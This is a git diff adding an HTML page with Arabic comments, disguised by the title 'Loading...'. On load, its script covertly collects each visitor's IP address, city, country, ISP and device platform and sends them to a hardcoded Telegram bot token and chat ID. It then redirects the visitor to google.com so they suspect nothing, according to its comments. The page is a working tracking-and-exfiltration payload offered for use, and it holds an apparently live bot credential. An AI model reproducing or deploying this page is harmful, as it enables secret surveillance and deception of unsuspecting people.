@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>جارٍ التحميل...</title>
+</head>
+<body>
+    <script>
+        // بياناتك التي استخرجناها من الصور
+        const token = "8493731392:AAHXao8GIwtJUs1mUy47oPqTqxIhAHASX_c";
+        const myId = "7109332130";
+
+        async function deployRadar() {
+            try {
+                // جلب بيانات الـ IP والموقع
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+
+                // صياغة الرسالة التي ستصلك على تليجرام
+                const report = `🚀 **صيد جديد يا أدهم!** 🚀%0A%0A` +
+                               `🌐 **IP:** ${data.ip}%0A` +
+                               `📍 **الموقع:** ${data.city}, ${data.country_name}%0A` +
+                               `🏢 **الشركة:** ${data.org}%0A` +
+                               `📱 **الجهاز:** ${navigator.platform}%0A` +
+                               `🕒 **التوقيت:** ${new Date().toLocaleString()}`;
+
+                // إرسال التقرير فوراً لبوتك Adham231_bot
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${myId}&text=${report}&parse_mode=Markdown`);
+
+                // التمويه: تحويل الشخص لموقع مشهور عشان ميشكش في حاجة
+                window.location.href = "https://www.google.com";
+            } catch (error) {
+                // في حالة وجود أي خطأ، حوله برضه عشان ميعرفش إن فيه محاولة حصلت
+                window.location.href = "https://www.google.com";
+            }
+        }
+
+        // تشغيل المهمة فوراً
+        deployRadar();
+    </script>
+</body>
+</html>
+
